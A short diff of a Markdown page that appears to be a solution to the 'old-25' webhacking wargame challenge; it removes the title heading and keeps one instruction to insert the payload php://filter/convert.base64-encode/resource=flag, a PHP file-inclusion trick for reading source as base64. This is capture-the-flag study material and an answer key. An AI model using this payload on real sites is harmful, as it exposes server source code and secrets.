@@ -3,7 +3,7 @@ layout: default
 title: old-25
 ---
 
-# Webhacking old-25 Solution
+
 
 insert this payload:
 `php://filter/convert.base64-encode/resource=flag`
